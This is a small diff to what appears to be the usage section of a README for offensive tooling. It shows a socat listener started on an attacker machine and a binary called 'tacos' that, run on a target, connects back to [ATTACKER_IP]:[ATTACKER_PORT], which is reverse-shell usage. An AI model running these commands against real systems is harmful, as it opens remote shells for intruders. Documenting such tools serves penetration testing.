@@ -31,7 +31,7 @@ tmux
 ./light-pty4all/socat-listener.sh --lhost [ATTACKER_IP] --lport [ATTACKER_PORT] #multi-handler
 
 # On target (transfer tacos as you wish)
-./tacos [ATTACKER_IP]
+./tacos [ATTACKER_IP]:[ATTACKER_PORT]
 # 💥
 ```
 
